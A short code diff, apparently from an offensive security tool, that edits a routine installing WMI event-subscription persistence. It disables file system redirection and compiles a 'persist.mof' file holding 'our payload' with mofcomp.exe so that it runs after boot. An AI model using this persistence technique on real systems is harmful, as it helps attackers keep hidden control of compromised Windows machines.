@@ -65,7 +65,7 @@ instance of __FilterToConsumerBinding
 				print_info("Disabling file system redirection")
 				with disable_fsr():
 					print_success("Successfully disabled file system redirection")
-					if process().create("mofcomp.exe", params="{}".format(os.path.join(tempfile.gettempdir(), "persist.mof")), 0):
+					if process().create("mofcomp.exe", params="{}".format(os.path.join(tempfile.gettempdir(), "persist.mof"))):
 						print_success("Successfully compiled mof file containing our payload ({})".format(payload))
 						print_success("Successfully installed persistence, payload will after boot")
 					else:
